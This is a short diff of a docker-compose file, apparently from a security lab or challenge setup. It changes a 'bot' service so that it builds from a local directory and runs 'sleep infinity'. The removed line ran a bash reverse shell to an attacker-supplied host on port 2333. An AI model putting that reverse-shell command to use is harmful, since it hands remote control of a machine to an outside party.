@@ -9,8 +9,8 @@ services:
         aliases:
           - bot
   bot:
-    image: ubuntu:18.04
-    command: bash -c "bash -i >& /dev/tcp/${attacker}/2333 0>&1"
+    build: ./bot
+    command: sleep infinity
     networks:
       mynet:
         aliases:
